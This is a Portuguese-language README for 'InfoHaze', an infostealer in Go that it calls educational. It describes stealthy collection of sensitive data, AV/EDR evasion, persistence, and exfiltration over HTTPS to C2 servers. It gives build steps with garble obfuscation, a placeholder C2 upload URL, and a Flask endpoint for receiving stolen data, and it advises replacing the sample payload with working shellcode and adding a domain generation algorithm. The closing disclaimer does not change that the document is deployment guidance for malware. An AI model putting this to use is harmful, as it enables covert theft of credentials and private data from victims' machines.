# InfoHaze

## Visão Geral
Infostealer somente para fins educacionais em Go, projetado para operar furtivamente em ambientes controlados, evadir AV/EDR e garantir persistência. Ele coleta dados sensíveis e exfiltra para servidores C2 via HTTPS.

## Requisitos
- Go 1.20 ou superior.
- Dependências:
  ```bash
  go get github.com/kbinani/screenshot
  go get github.com/klauspost/compress/zlib
  go get golang.org/x/sys/windows
  ```
- Compilação com ofuscação:
  ```bash
  garble -a -tiny build -o infostealer.exe
  ```

## Instalação e Uso
1. Clone o repositório:
   ```bash
   git clone https://github.com/marcostolosa/infoHaze.git
   cd infoHaze
   ```
2. Instale dependências:
   ```bash
   go mod tidy
   ```
3. Compile o binário:
   ```bash
   go build -ldflags "-s -w" -o infostealer infostealer.go
   ```
4. Configure os servidores C2 no código (substitua `https://backup1.example.com/upload` e outros).
5. Execute no ambiente controlado:
   ```bash
   ./infoHaze
   ```

## Configuração do Servidor C2
- Configure um servidor HTTPS para receber dados (ex.: Flask ou Node.js).
- Implemente descriptografia AES-GCM e descompressão zlib no servidor.
- Exemplo de endpoint:
  ```python
  from flask import Flask, request
  app = Flask(__name__)

  @app.route('/upload', methods=['POST'])
  def upload():
      data = request.data
      # Descriptografar e descomprimir
      with open('output.bin', 'wb') as f:
          f.write(data)
      return 'OK', 200
  ```

## Limitações
- O payload injetado é um exemplo simples (NOP sled + RET). Substitua por um payload funcional (ex.: shellcode).
- A detecção de sandbox pode ser expandida com mais verificações (ex.: análise de disco ou CPU).
- Considere integrar DGA (Domain Generation Algorithm) para domínios C2 dinâmicos.

## Aviso
Este software é fornecido exclusivamente para testes de segurança em ambientes controlados e legais. O uso não autorizado é ilegal e antiético. Os desenvolvedores não se responsabilizam por qualquer uso indevido.
